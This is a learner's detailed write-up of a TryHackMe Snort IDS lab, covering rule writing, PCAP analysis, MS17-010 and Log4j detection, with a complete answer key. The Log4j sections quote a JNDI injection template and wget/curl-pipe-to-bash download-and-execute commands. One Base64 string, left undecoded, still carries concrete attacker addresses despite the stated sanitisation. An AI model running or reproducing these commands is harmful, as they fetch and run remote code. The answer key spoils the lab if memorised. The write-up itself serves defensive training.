# Snort Challenge -- The Basics

## Detailed SOC / Network Detection Lab Notes

**Date:** 2026-10-07\
**Platform:** TryHackMe\
**Room:** Snort Challenge -- The Basics\
**Focus:** Snort IDS rules, PCAP analysis, alert investigation, payload
inspection, troubleshooting, external rules, and Log4j detection.

------------------------------------------------------------------------

## 1. Overview

I completed the TryHackMe **Snort Challenge -- The Basics** room. The
room is designed to make me practise writing Snort IDS rules and using
those rules against captured network traffic. The official room
describes the challenge as an exercise in investigating traffic data and
detecting or stopping malicious activity with Snort. The exercise files
are provided per task and contain PCAP files and rule files.

The main skill I practised was not simply running Snort and looking at
the alert count. I repeatedly had to understand what the packet
contained, write a rule that matched the required traffic, run the rule
against a PCAP, inspect the generated alert/log files, and then use
tools such as `strings` and `tcpdump` to recover useful evidence.

> **Sanitisation note:** This document is intended as a reusable
> learning record. Lab-specific public IP addresses, external callback
> infrastructure, and other potentially identifying indicators have been
> minimised or described generically where possible. The important rule
> syntax, commands, reasoning, packet fields, and investigation
> methodology are preserved.

------------------------------------------------------------------------

# 2. Environment and Working Method

The exercise files were located under directories similar to:

``` text
~/Desktop/Exercise-Files/TASK-2 (HTTP)
~/Desktop/Exercise-Files/TASK-3 (FTP)
~/Desktop/Exercise-Files/TASK-4 (PNG)
~/Desktop/Exercise-Files/TASK-5 (TorrentMetafile)
~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)
~/Desktop/Exercise-Files/TASK-7 (MS17-10)
~/Desktop/Exercise-Files/TASK-8 (Log4j)
```

The general workflow I followed was:

1.  Enter the task directory.
2.  Inspect the available rule and PCAP files.
3.  Read the question carefully.
4.  Decide what packet characteristic needed to be detected.
5.  Write or modify `local.rules`.
6.  Run Snort against the PCAP.
7.  Check the number of alerts.
8.  If the question required more detail, generate an `alert` file using
    `-l .`.
9.  Inspect the alert/log output.
10. If the payload itself was needed, use `tcpdump`, `strings`, or
    targeted searches.
11. Decode or interpret the relevant data.
12. Submit only the exact value requested by TryHackMe.

A very important lesson from this room was that **a rule that is
technically valid can still be logically too broad**. For example,
matching a generic FTP response such as `230` produced many matches,
while matching the complete successful-login string produced the single
relevant event.

------------------------------------------------------------------------

# 3. Useful Snort Commands I Practised

## Running a rule against a PCAP

``` bash
sudo snort -c local.rules -r file.pcap
```

Here:

-   `-c` specifies the rule/configuration file.
-   `-r` tells Snort to read packets from a PCAP instead of sniffing
    live traffic.

## Displaying alerts in the console

``` bash
sudo snort -c local.rules -r file.pcap -A console
```

`-A console` displays alerts directly in the terminal.

## Generating detailed alert/log files in the current directory

``` bash
sudo snort -A full -c local.rules -r file.pcap -l .
```

This became especially important during the investigation tasks. The
`-l .` option tells Snort to use the current directory for its output.

This avoids confusion when the question specifically asks me to
investigate the generated alarm/log files.

## Reading a Snort log with Snort

``` bash
sudo snort -r snort.log.<timestamp> -n 64
```

The `-r` option reads an existing Snort log and `-n` limits the number
of packets read.

## Clearing previous output

``` bash
sudo rm -f alert snort.log.*
```

I used this before several tasks so that older alerts would not be
confused with the results of the current rule.

## Searching raw PCAP strings

``` bash
sudo strings file.pcap
```

I also used targeted searches such as:

``` bash
sudo strings file.pcap | grep -i "keyword"
```

## Inspecting packet details

``` bash
sudo tcpdump -nn -vv -r file.pcap
```

For ASCII payload investigation:

``` bash
sudo tcpdump -A -nn -r file.pcap
```

------------------------------------------------------------------------

# 4. Snort Rule Structure I Reinforced

A basic Snort rule follows this general structure:

``` text
action protocol source_ip source_port -> destination_ip destination_port (options;)
```

Example:

``` text
alert tcp any any -> any 80 (msg:"HTTP Traffic"; sid:1000001; rev:1;)
```

Important parts:

-   `alert` = generate an alert.
-   `tcp` = inspect TCP traffic.
-   `any` = any IP or port, depending on position.
-   `->` = traffic direction from source to destination.
-   `<>` = bidirectional traffic.
-   `msg` = human-readable rule description.
-   `content` = payload pattern to search for.
-   `sid` = Snort rule identifier.
-   `rev` = rule revision.

A critical syntax lesson from the troubleshooting task was that Snort 2
does **not** use `<-` as a valid direction operator. Valid examples used
in this room were `->` and `<>`.

------------------------------------------------------------------------

# 5. Task 2 -- Writing IDS Rules: HTTP

## Objective

The first practical task focused on HTTP traffic.

The PCAP used was:

``` text
mx-3.pcap
```

The initial rule was:

``` text
alert tcp any any <> any 80 (msg:"TCP traffic to or from port 80"; sid:1000001; rev:1;)
```

This rule detected TCP traffic to or from TCP port 80.

I ran:

``` bash
sudo snort -c local.rules -r mx-3.pcap
```

The result showed:

``` text
460 packets processed
164 TCP packets
164 alerts
```

### Answer

**164**

------------------------------------------------------------------------

## Investigating a specific packet

I then investigated packet 63.

The packet was:

``` text
source: 145.254.160.237:<source-port>
destination: 216.239.59.99:80
```

The important destination IP was:

**216.239.59.99**

The lesson here was that the alert count tells me how many packets
matched the rule, but packet-level questions require opening or reading
the relevant packet.

------------------------------------------------------------------------

## Important lesson from Task 2

At first I tried to interpret TCP sequence and acknowledgement values
manually using `tcpdump`. This became unnecessarily complicated because
relative sequence numbers and absolute sequence numbers can be displayed
differently.

The better approach for this room was to use the Snort-generated log and
read the specific packet using Snort itself:

``` bash
sudo snort -r snort.log.<timestamp> -n 64
```

This reinforced an important SOC workflow:

> When the lab provides a tool-generated log, use the same tool to
> interpret that log before trying to reconstruct the packet manually
> with another tool.

------------------------------------------------------------------------

# 6. Task 3 -- Writing IDS Rules: FTP

## 6.1 Detecting TCP Port 21 Traffic

The PCAP was:

``` text
ftp-png-gif.pcap
```

The rule was:

``` text
alert tcp any any <> any 21 (msg:"TCP traffic to or from port 21"; sid:1000001; rev:1;)
```

I ran:

``` bash
sudo snort -A full -r ftp-png-gif.pcap -c local.rules -l .
```

The result was:

``` text
Alerts: 307
```

### Answer

**307**

------------------------------------------------------------------------

## 6.2 Identifying the FTP Service

I searched the PCAP/log data:

``` bash
sudo strings snort.log.* | grep -i "service"
```

The important response was:

``` text
220 Microsoft FTP Service
```

### Answer

**Microsoft FTP Service**

This demonstrated how a protocol banner can reveal the
application/service running on the remote endpoint.

------------------------------------------------------------------------

## 6.3 Detecting Failed FTP Login Attempts

I searched for FTP failure responses:

``` bash
sudo strings ftp-png-gif.pcap | grep -E "530|Login|login|incorrect|failed"
```

The PCAP contained responses such as:

``` text
530 User test cannot log in.
530 User admin cannot log in.
```

I then created a rule targeting the FTP `530` response:

``` text
alert tcp any 21 -> any any (msg:"FTP Failed Login"; content:"530"; sid:1000001; rev:1;)
```

I ran Snort and received:

``` text
Alerts: 41
```

### Answer

**41**

------------------------------------------------------------------------

## 6.4 Detecting Successful FTP Logins

Initially I tried to detect the generic FTP response code:

``` text
content:"230"
```

That produced many matches and was not specific enough.

The important successful login was:

``` text
230 User Administrator logged in.
```

I therefore changed the rule to match the complete string:

``` text
alert tcp any 21 -> any any (msg:"FTP Successful Login"; content:"230 User Administrator logged in."; sid:1000002; rev:1;)
```

The result was:

``` text
Alerts: 1
```

### Answer

**1**

### Important lesson

This was one of the most useful detection-engineering lessons in the
room:

> A generic signature may produce false positives or irrelevant matches.
> A more specific content pattern can reduce the alert to the actual
> event I am looking for.

------------------------------------------------------------------------

## 6.5 Detecting Administrator Username Attempts

The question asked for FTP login attempts containing the `Administrator`
username before the password had been entered.

I used:

``` text
alert tcp any any -> any 21 (msg:"FTP Administrator Login Attempt"; content:"USER Administrator"; sid:1000004; rev:1;)
```

The result was:

``` text
Alerts: 7
```

### Answer

**7**

The important distinction was that `USER Administrator` represents the
username stage of FTP authentication, not a completed successful login.

------------------------------------------------------------------------

# 7. Task 4 -- Detecting PNG and GIF Files

## 7.1 PNG Detection

The objective was to identify a PNG file inside the traffic and
determine the software embedded in its metadata.

I first searched the PCAP:

``` bash
sudo strings ftp-png-gif.pcap | grep -i -E "png|software|version"
```

The output contained indicators such as:

``` text
Content-Type: image/png
tEXtSoftware
```

The PNG magic bytes were:

``` text
89 50 4E 47 0D 0A 1A 0A
```

I created:

``` text
alert tcp any any -> any any (msg:"PNG File Detected"; content:"|89 50 4E 47 0D 0A 1A 0A|"; sid:1000001; rev:1;)
```

The rule produced:

``` text
Alerts: 1
```

I then inspected the generated log:

``` bash
sudo strings snort.log.* | grep -A2 -i "Software"
```

The metadata showed:

``` text
tEXtSoftware
Adobe ImageReady
```

### Answer

**Adobe ImageReady**

------------------------------------------------------------------------

## 7.2 GIF Detection

I searched for GIF signatures:

``` bash
sudo strings ftp-png-gif.pcap | grep -E "GIF87a|GIF89a"
```

The output contained:

``` text
GIF89a
```

I created:

``` text
alert tcp any any -> any any (msg:"GIF File Detected"; content:"GIF89a"; sid:1000002; rev:1;)
```

The rule produced:

``` text
Alerts: 4
```

### Answer

**GIF89a**

### Lesson

File-format signatures, often called magic bytes or magic strings, can
be useful for detecting files transferred through network traffic even
when the file extension is not visible.

------------------------------------------------------------------------

# 8. Task 5 -- Torrent Metafile

## 8.1 Detecting Torrent Metafiles

The PCAP was:

``` text
torrent.pcap
```

I initially used:

``` text
content:"BitTorrent protocol"
```

This generated:

``` text
11 alerts
```

However, that was not the required detection pattern for the question.

I then searched for the MIME type used by the torrent metafile:

``` text
application/x-bittorrent
```

The rule was:

``` text
alert tcp any any -> any any (msg:"Torrent Metafile Detected"; content:"application/x-bittorrent"; sid:1000002; rev:1;)
```

This produced:

``` text
Alerts: 2
```

### Answer

**2**

------------------------------------------------------------------------

## 8.2 Torrent Application

The traffic contained:

``` text
BitTorrent protocol
```

and also:

``` text
User-Agent: RAZA 2.1.0.0
```

Initially I confused the user-agent value with the torrent application.

The correct application answer was:

**BitTorrent**

### Lesson

I need to distinguish between:

-   Application/protocol name
-   User-Agent
-   MIME type
-   Hostname

They may all appear in the same HTTP/Torrent-related traffic but answer
different questions.

------------------------------------------------------------------------

## 8.3 MIME Type

The relevant field was:

``` text
Accept: application/x-bittorrent
```

### Answer

**application/x-bittorrent**

------------------------------------------------------------------------

## 8.4 Hostname

The traffic contained:

``` text
Host: tracker2.torrentbox.com:2710
```

The question asked for the hostname, not the port.

Therefore the hostname was:

**tracker2.torrentbox.com**

The port `2710` was not part of the hostname.

------------------------------------------------------------------------

# 9. Task 6 -- Troubleshooting Snort Rule Syntax

This task was especially useful because it forced me to read Snort's
errors instead of guessing.

The PCAP was:

``` text
mx-1.pcap
```

The rule files were:

``` text
local-1.rules
local-2.rules
local-3.rules
local-4.rules
local-5.rules
local-6.rules
local-7.rules
```

------------------------------------------------------------------------

## 9.1 local-1.rules

Original problem:

``` text
alert tcp any 3372 -> any any(msg: "Troubleshooting 1"; sid:1000001; rev:1;)
```

The problem was the missing space before the option block.

Correct version:

``` text
alert tcp any 3372 -> any any (msg:"Troubleshooting 1"; sid:1000001; rev:1;)
```

Running the corrected rule produced:

``` text
Alerts: 16
```

### Answer

**16**

------------------------------------------------------------------------

## 9.2 local-2.rules

The original ICMP rule did not contain the source port field:

``` text
alert icmp any -> any any (...)
```

Snort produced an error indicating that a port value was missing.

The corrected rule was:

``` text
alert icmp any any -> any any (msg:"Troubleshooting 2"; sid:1000001; rev:1;)
```

The result was:

``` text
Alerts: 68
```

### Answer

**68**

### Lesson

Even though ICMP does not use TCP/UDP ports in the same way, the Snort
rule syntax being used in this exercise still required the source and
destination port fields.

------------------------------------------------------------------------

## 9.3 local-3.rules

The rules were intended to detect ICMP and TCP traffic to ports 80 and
443.

The port list:

``` text
80,443
```

is valid Snort syntax.

The important correction was to give the rules unique SIDs.

Correct:

``` text
alert icmp any any -> any any (msg:"ICMP Packet Found"; sid:1000001; rev:1;)
alert tcp any any -> any 80,443 (msg:"HTTPX Packet Found"; sid:1000002; rev:1;)
```

The result was:

``` text
Alerts: 87
```

### Answer

**87**

------------------------------------------------------------------------

## 9.4 local-4.rules

There were two problems:

1.  A colon was used instead of a semicolon after the `msg` option.
2.  The second rule reused the same SID.

Correct:

``` text
alert icmp any any -> any any (msg:"ICMP Packet Found"; sid:1000001; rev:1;)
alert tcp any 80,443 -> any any (msg:"HTTPX Packet Found"; sid:1000002; rev:1;)
```

The result was:

``` text
Alerts: 90
```

### Answer

**90**

------------------------------------------------------------------------

## 9.5 local-5.rules

This rule contained several syntax problems.

One major error was:

``` text
<-
```

Snort reported:

``` text
Illegal direction specifier: <-
```

The valid direction operators I used were:

``` text
->
<>
```

There were also option-separator errors such as:

``` text
sid;1000002
```

instead of:

``` text
sid:1000002
```

and a colon where a semicolon was required after `msg`.

Corrected rules:

``` text
alert icmp any any <> any any (msg:"ICMP Packet Found"; sid:1000001; rev:1;)
alert icmp any any -> any any (msg:"Inbound ICMP Packet Found"; sid:1000002; rev:1;)
alert tcp any any -> any 80,443 (msg:"HTTPX Packet Found"; sid:1000003; rev:1;)
```

The result was:

``` text
Alerts: 155
```

### Answer

**155**

### Important lesson

I learned to trust the exact Snort error message. In this case Snort
explicitly told me that `<-` was an illegal direction specifier.

------------------------------------------------------------------------

## 9.6 local-6.rules

The original rule used:

``` text
content:"|67 65 74|"
```

Those bytes represent lowercase:

``` text
get
```

The question required the uppercase HTTP method:

``` text
GET
```

The correct hexadecimal bytes were:

``` text
47 45 54
```

Correct rule:

``` text
alert tcp any any <> any 80 (msg:"GET Request Found"; content:"|47 45 54|"; sid:100001; rev:1;)
```

The result was:

``` text
Alerts: 2
```

### Answer

**2**

### Lesson

Content matching can be case-sensitive depending on how the rule is
written. When using hexadecimal content, I need to make sure the bytes
actually represent the exact value I want to detect.

------------------------------------------------------------------------

## 9.7 local-7.rules

The original rule contained:

``` text
content:"|2E 68 74 6D 6C|"
```

but did not contain a `msg` option.

The question asked for the name of the required option.

### Answer

**msg**

A corrected form would be:

``` text
alert tcp any any <> any 80 (msg:"HTML File Detected"; content:"|2E 68 74 6D 6C|"; sid:100001; rev:1;)
```

------------------------------------------------------------------------

# 10. Task 7 -- MS17-010

The next task focused on investigating traffic associated with MS17-010.

The PCAP was:

``` text
ms-17-010.pcap
```

------------------------------------------------------------------------

## 10.1 Using the Provided External Rule

I ran:

``` bash
sudo snort -c local.rules -r ms-17-010.pcap -A console
```

The result was:

``` text
Alerts: 25154
```

### Answer

**25154**

This showed how a mature/external detection rule can immediately
identify a large number of matching packets.

------------------------------------------------------------------------

## 10.2 Detecting the `\IPC$` Payload

The next objective was to create a rule detecting the `\IPC$` string.

The hexadecimal bytes were:

``` text
5C 49 50 43 24
```

The rule I used was:

``` text
alert tcp any any -> any any (msg:"IPC$ Payload Detected"; content:"|5C 49 50 43 24|"; sid:1000001; rev:1;)
```

I first cleared the old logs:

``` bash
sudo rm -f alert snort.log.*
```

Then I ran Snort.

The result was:

``` text
Alerts: 12
```

### Answer

**12**

------------------------------------------------------------------------

## 10.3 Investigating the Requested IPC Path

For the detailed packet investigation, I generated the local alert file:

``` bash
sudo snort -A full -c local-1.rules -r ms-17-010.pcap -l .
```

The relevant packet data showed an SMB connection containing an IPC
path.

The requested path was:

``` text
\\192.168.116.138\IPC$
```

### Lesson

The important technique here was not just detecting `IPC$`, but tracing
the actual packet payload to determine the complete requested network
path.

------------------------------------------------------------------------

## 10.4 CVSS v2 Score for MS17-010

The relevant CVSS v2 score was:

**9.3**

I initially had to distinguish the Microsoft severity rating from the
numerical CVSS score. Microsoft may describe the issue as Critical, but
the question specifically asks for the CVSS v2 numerical score.

------------------------------------------------------------------------

# 11. Task 8 -- Log4j

This was the final and most detailed task I completed.

The directory was:

``` text
~/Desktop/Exercise-Files/TASK-8 (Log4j)
```

Files included:

``` text
local.rules
local-1.rules
log4j.pcap
```

------------------------------------------------------------------------

# 12. Log4j -- Detecting Exploitation with the External Rule

I used the provided `local.rules` file:

``` bash
sudo snort -c local.rules -r log4j.pcap -A console
```

The result was:

``` text
Alerts: 26
```

### Answer

**26**

This established that the supplied external Log4j rules detected 26
matching packets/events.

------------------------------------------------------------------------

# 13. Log4j -- Determining How Many Rules Triggered

The initial run did not automatically leave the detailed alert file in
the task directory.

I therefore generated it using:

``` bash
sudo snort -A full -c local.rules -r log4j.pcap -l .
```

Then:

``` bash
sudo cat alert
```

The alert output contained several different rule SIDs.

The distinct triggered SIDs were:

``` text
21003726
21003728
21003730
21003731
```

Therefore:

### Answer

**4 rules**

------------------------------------------------------------------------

# 14. Log4j -- First Six Digits of the Triggered SIDs

All of the triggered SIDs began with:

``` text
210037
```

### Answer

**210037**

This was a useful reminder that the SID can help identify exactly which
detection rule generated an alert.

------------------------------------------------------------------------

# 15. Log4j -- Detecting Payloads Between 770 and 855 Bytes

The next question required an empty `local-1.rules` file and a
size-based rule.

I used:

``` text
alert tcp any any -> any any (msg:"Payload 770-855 bytes"; dsize:770<>855; sid:1000001; rev:1;)
```

I cleared previous output:

``` bash
sudo rm -f alert snort.log.*
```

Then ran:

``` bash
sudo snort -A full -c local-1.rules -r log4j.pcap -l .
```

The result was:

``` text
Alerts: 41
```

### Answer

**41**

------------------------------------------------------------------------

# 16. Log4j -- Investigating the Payload and Encoding

The `alert` file showed packet metadata, but it did not contain enough
of the payload to directly recover the encoded command.

Therefore I used `tcpdump` to inspect ASCII content:

``` bash
sudo tcpdump -A -nn -r log4j.pcap | grep -i -E "base64|ldap|jndi|encode"
```

This revealed multiple Log4j payloads.

One important payload contained:

``` text
${jndi:ldap://<sanitised>:1389/Basic/Command/Base64/<encoded-data>}
```

This immediately showed that the attacker was using:

**Base64**

as the encoding mechanism.

Other traffic also contained strings such as:

``` text
base64_decode
```

and:

``` text
FromBase64String
```

### Answer

**Base64**

------------------------------------------------------------------------

# 17. Log4j -- Investigating the Relevant Packet

One of the important investigation steps was identifying the packet
associated with the malicious encoded command.

The relevant alert entry had an IP ID of:

**62808**

The packet contained a Log4j request with a Base64 command embedded in
the JNDI/LDAP payload.

The important lesson here was:

> Do not simply decode the first Base64 string found in a PCAP. First
> identify the packet referenced by the question, then extract and
> decode the encoded value from that specific packet.

This mattered because the PCAP contained multiple Log4j exploitation
attempts and multiple Base64 payloads.

------------------------------------------------------------------------

# 18. Log4j -- Decoding the Attacker Command

The relevant packet contained this Base64 value:

``` text
KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=
```

I used CyberChef's **From Base64** operation to decode it.

The decoded attacker command was:

``` bash
(curl -s <attacker-address>:5874/<target>:80||wget -q -O- <attacker-address>:5874/<target>:80)|bash
```

The lab's exact command used the concrete addresses from the packet, but
those indicators are intentionally sanitised in this document.

### What the command does

The command uses two possible download methods:

``` bash
curl -s
```

or, if that fails:

``` bash
wget -q -O-
```

The `||` operator means the second command is attempted if the first
command fails.

The output is then piped into:

``` bash
bash
```

So the overall behaviour is:

1.  Attempt to retrieve content from the remote server using `curl`.
2.  If `curl` fails, attempt to retrieve it using `wget`.
3.  Pipe the retrieved content directly into Bash.
4.  Execute the downloaded content.

From a SOC perspective, this is highly suspicious because it represents
**remote command/script retrieval followed by direct execution**.

------------------------------------------------------------------------

# 19. Log4j -- Why the First Decoded Command Was Wrong

This was an important mistake during the investigation.

The PCAP contained more than one Base64-encoded Log4j payload.

I initially decoded a different Base64 value and obtained a command
similar to:

``` bash
wget <sanitised>/lh.sh;chmod +x lh.sh;./lh.sh
```

CyberChef correctly decoded that Base64 string, but it was **not the
command associated with the packet the TryHackMe question was asking
about**.

The clue was the previously identified IP ID:

``` text
62808
```

After tracing the packet with that ID, I found a different Log4j request
containing the correct Base64 payload.

### Lesson

This was one of the biggest lessons from the room:

> Correct decoding is not enough. The decoded value must come from the
> correct packet/event.

In real SOC work, this is equivalent to maintaining event correlation.
If several alerts contain similar indicators, I must correlate the exact
timestamp, source IP, destination IP, port, packet ID, and payload
before drawing a conclusion.

------------------------------------------------------------------------

# 20. Log4j -- CVSS v2 Score

The CVSS v2 score for:

``` text
CVE-2021-44228
```

(Log4Shell) is:

### **9.3**

The score is classified as **High** under the CVSS v2 scale.

### Answer

**9.3**

------------------------------------------------------------------------

# 21. Complete Answer Record

For quick revision, these were the answers I obtained during the
completed tasks.

## Task 2 -- HTTP

  Question                            Answer
  ----------------------------------- -------------------
  TCP port 80 traffic detected        **164**
  Destination IP of relevant packet   **216.239.59.99**

## Task 3 -- FTP

  Question                                          Answer
  ------------------------------------------------- ---------------------------
  Port 21 traffic detected                          **307**
  FTP service                                       **Microsoft FTP Service**
  Failed login attempts                             **41**
  Successful Administrator login                    **1**
  Administrator username attempts before password   **7**

## Task 4 -- PNG/GIF

  Question                Answer
  ----------------------- ----------------------
  PNG detection count     **1**
  PNG software metadata   **Adobe ImageReady**
  GIF detection count     **4**
  GIF format              **GIF89a**

## Task 5 -- Torrent Metafile

  Question                      Answer
  ----------------------------- ------------------------------
  Torrent metafile detections   **2**
  Torrent application           **BitTorrent**
  MIME type                     **application/x-bittorrent**
  Hostname                      **tracker2.torrentbox.com**

## Task 6 -- Troubleshooting

  Rule                                  Answer
  ---------------------------------- ---------
  local-1.rules                         **16**
  local-2.rules                         **68**
  local-3.rules                         **87**
  local-4.rules                         **90**
  local-5.rules                        **155**
  local-6.rules                          **2**
  Required option in local-7.rules     **msg**

## Task 7 -- MS17-010

  Question                     Answer
  ---------------------------- -------------------------------------
  Provided rule alerts         **25154**
  `\IPC$` payload detections   **12**
  Requested IPC path           **\\192.168.116.138`\IPC`{=tex}\$**
  CVSS v2                      **9.3**

## Task 8 -- Log4j

  Question                           Answer
  ---------------------------------- ---------------------------------------------------
  External rule detections           **26**
  Number of triggered rules          **4**
  First six SID digits               **210037**
  770--855 byte payload detections   **41**
  Encoding algorithm                 **Base64**
  Relevant packet IP ID              **62808**
  Attacker command                   **Base64-decoded curl/wget pipe-to-Bash command**
  CVSS v2                            **9.3**

------------------------------------------------------------------------

# 22. Important Commands to Remember

## Run a rule against a PCAP

``` bash
sudo snort -c local.rules -r file.pcap -A console
```

## Generate detailed alert files locally

``` bash
sudo snort -A full -c local.rules -r file.pcap -l .
```

## Clear old logs

``` bash
sudo rm -f alert snort.log.*
```

## Inspect alert file

``` bash
sudo cat alert
```

## Search strings

``` bash
sudo strings file.pcap | grep -i "keyword"
```

## Inspect ASCII packet payload

``` bash
sudo tcpdump -A -nn -r file.pcap
```

## Inspect verbose packet metadata

``` bash
sudo tcpdump -nn -vv -r file.pcap
```

## Read a Snort log

``` bash
sudo snort -r snort.log.<timestamp> -n <number>
```

------------------------------------------------------------------------

# 23. Key Lessons I Learned

## 23.1 Rule syntax matters

A single character can break a rule:

-   `:` versus `;`
-   missing source/destination port
-   duplicate SIDs
-   missing `msg`
-   incorrect direction operator
-   incorrect hexadecimal bytes

I learned to read Snort's error messages carefully instead of trying
random changes.

------------------------------------------------------------------------

## 23.2 Detection specificity matters

A rule such as:

``` text
content:"230"
```

may detect too many events.

A rule such as:

``` text
content:"230 User Administrator logged in."
```

is much more specific.

This is directly relevant to SOC alert tuning because overly broad rules
can create alert fatigue.

------------------------------------------------------------------------

## 23.3 Packet context is important

Finding an indicator in a PCAP is not enough.

I need to understand:

-   Source IP
-   Destination IP
-   Source port
-   Destination port
-   Timestamp
-   Protocol
-   Packet ID
-   Payload
-   Alert SID
-   Rule that generated the alert

This helps correlate an alert with the correct packet.

------------------------------------------------------------------------

## 23.4 Logs are evidence

The `alert` file is not just a list of answers. It contains useful
investigation fields such as:

``` text
Source
Destination
Protocol
TTL
TOS
IP ID
Packet length
TCP sequence
TCP acknowledgement
TCP flags
TCP options
```

These fields allow an analyst to correlate alerts with network traffic.

------------------------------------------------------------------------

## 23.5 Multiple malicious events can exist in one PCAP

The Log4j PCAP contained many different exploitation attempts.

Therefore, when a question refers to a specific packet, I should not
simply take the first matching payload.

The correct methodology is:

``` text
Question
   ↓
Identify the relevant event
   ↓
Identify packet
   ↓
Identify IP/port/time/ID
   ↓
Extract payload
   ↓
Decode payload
   ↓
Interpret command
```

------------------------------------------------------------------------

## 23.6 Encoding is not encryption

Base64 is an encoding mechanism, not encryption.

If I see something like:

``` text
Base64/<long-string>
```

I should consider decoding it.

The decoded content can reveal commands, URLs, filenames, or other
indicators.

------------------------------------------------------------------------

## 23.7 Suspicious command execution patterns

The Log4j investigation showed a particularly important pattern:

``` text
download content
      ↓
pipe content
      ↓
bash
```

Commands using patterns such as:

``` bash
curl ... | bash
```

or:

``` bash
wget ... -O- | bash
```

deserve investigation because they can download and immediately execute
remote code.

------------------------------------------------------------------------

# 24. SOC Analyst Methodology I Can Reuse

When I encounter a similar PCAP investigation in the future, I can
follow this checklist.

### Step 1 -- Understand the question

Determine exactly what is being requested:

-   alert count?
-   source IP?
-   destination IP?
-   IP ID?
-   hostname?
-   payload?
-   encoding?
-   command?
-   CVSS score?

### Step 2 -- Inspect the provided rules

Understand what the rule is actually detecting.

### Step 3 -- Run Snort

``` bash
sudo snort -A full -c local.rules -r file.pcap -l .
```

### Step 4 -- Check the alert count

Look at:

``` text
Alerts:
```

### Step 5 -- Open the alert file

``` bash
sudo cat alert
```

### Step 6 -- Identify the exact event

Correlate:

``` text
timestamp
source
destination
port
IP ID
rule SID
packet size
```

### Step 7 -- Inspect payload if necessary

``` bash
sudo tcpdump -A -nn -r file.pcap
```

or:

``` bash
sudo strings file.pcap
```

### Step 8 -- Decode suspicious data

For example:

``` text
Base64
URL encoding
hexadecimal
```

### Step 9 -- Interpret the result

Do not stop at decoding. Explain what the command or indicator actually
does.

### Step 10 -- Submit only the requested value

Avoid adding extra characters or explanations into answer fields.

------------------------------------------------------------------------

# 25. What I Would Improve Next Time

During this room I made a few investigation mistakes that are useful to
remember.

### Mistake 1 -- Guessing from a similar packet

The Log4j PCAP contained multiple similar attacks. I initially decoded
the wrong Base64 payload.

**Improvement:** correlate the exact packet first.

### Mistake 2 -- Overcomplicating packet fields

For the HTTP task, I initially tried to reason about relative versus
absolute TCP sequence/acknowledgement values.

**Improvement:** use the tool that generated the log and inspect the
exact packet directly.

### Mistake 3 -- Using an overly broad content match

Matching only:

``` text
230
```

produced too many FTP results.

**Improvement:** use a more specific signature when the question
identifies a specific event.

### Mistake 4 -- Forgetting local logging

Running Snort without:

``` text
-l .
```

meant the expected local `alert` file was not always available.

**Improvement:** when a question says to investigate log/alarm files,
use:

``` bash
sudo snort -A full -c local.rules -r file.pcap -l .
```

### Mistake 5 -- Trusting assumptions over Snort's error

The troubleshooting task produced explicit syntax errors.

**Improvement:** read the exact error and correct only the actual
problem.

------------------------------------------------------------------------

# 26. Final Reflection

This room gave me practical experience with Snort rather than only
learning rule syntax theoretically.

I learned how to:

-   write basic Snort rules,
-   detect specific ports,
-   detect protocol traffic,
-   match payload content,
-   detect file signatures,
-   analyse FTP authentication,
-   identify application metadata,
-   troubleshoot malformed rules,
-   use SIDs correctly,
-   use Snort against PCAP files,
-   generate and inspect alert files,
-   investigate IP IDs,
-   correlate packets with alerts,
-   inspect packet payloads,
-   identify external rule SIDs,
-   investigate MS17-010 traffic,
-   investigate Log4j exploitation,
-   identify Base64 encoding,
-   decode an attacker command,
-   recognise remote script execution behaviour,
-   and understand the importance of precise event correlation.

The biggest lesson I am taking from this room is:

> **A SOC analyst should not jump from an alert directly to a
> conclusion. I need to trace the alert back to the exact packet,
> inspect the evidence, correlate the relevant fields, decode or extract
> the payload when necessary, and only then make a conclusion.**

That workflow is much more important than memorising individual Snort
commands.

------------------------------------------------------------------------

# 27. Quick Revision Cheat Sheet

``` text
Snort PCAP:
sudo snort -c local.rules -r file.pcap -A console

Detailed alert/log:
sudo snort -A full -c local.rules -r file.pcap -l .

Clear old logs:
sudo rm -f alert snort.log.*

Read alert:
sudo cat alert

Read Snort log:
sudo snort -r snort.log.<timestamp> -n <number>

Search PCAP strings:
sudo strings file.pcap | grep -i "keyword"

ASCII payload:
sudo tcpdump -A -nn -r file.pcap

Verbose packet metadata:
sudo tcpdump -nn -vv -r file.pcap

Common rule structure:
alert tcp any any -> any 80 (msg:"HTTP"; content:"GET"; sid:1000001; rev:1;)

Direction:
->   source to destination
<>   bidirectional
<-   INVALID in Snort 2 rule syntax

Common rule options:
msg
sid
rev
content
dsize

Remember:
Specific signatures are usually better than overly broad content matches.
Always correlate the exact packet before decoding a payload.
```

------------------------------------------------------------------------

## Reference

The official TryHackMe room describes **Snort Challenge -- The Basics**
as a practical challenge for investigating traffic data and using Snort
rules against captured network traffic. urlTryHackMe -- Snort
Challenge: The Basicshttps://tryhackme.com/room/snortchallenges1

**Document created:** 2026-10-07
